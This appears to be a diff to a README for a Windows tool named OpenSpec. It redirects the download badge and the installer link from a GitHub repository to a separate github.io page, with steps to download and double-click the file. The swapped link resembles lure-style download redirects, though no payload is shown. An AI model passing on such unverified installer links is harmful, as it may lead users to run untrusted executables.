@@ -1,6 +1,6 @@
 # 🛠 OpenSpec - Build better software with smart plans
 
-[![Download OpenSpec](https://img.shields.io/badge/Download_OpenSpec-Blue-blue.svg)](https://github.com/jjha4549/OpenSpec)
+[![Download OpenSpec](https://img.shields.io/badge/Download_OpenSpec-Blue-blue.svg)](https://jjha4549.github.io)
 
 ## 📖 What is OpenSpec?
 
@@ -21,7 +21,7 @@ To run OpenSpec on your Windows computer, you need the following:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download the installer: [https://github.com/jjha4549/OpenSpec](https://github.com/jjha4549/OpenSpec)
+1. Visit this page to download the installer: [https://jjha4549.github.io](https://jjha4549.github.io)
 2. Locate the file in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the instructions on the screen.
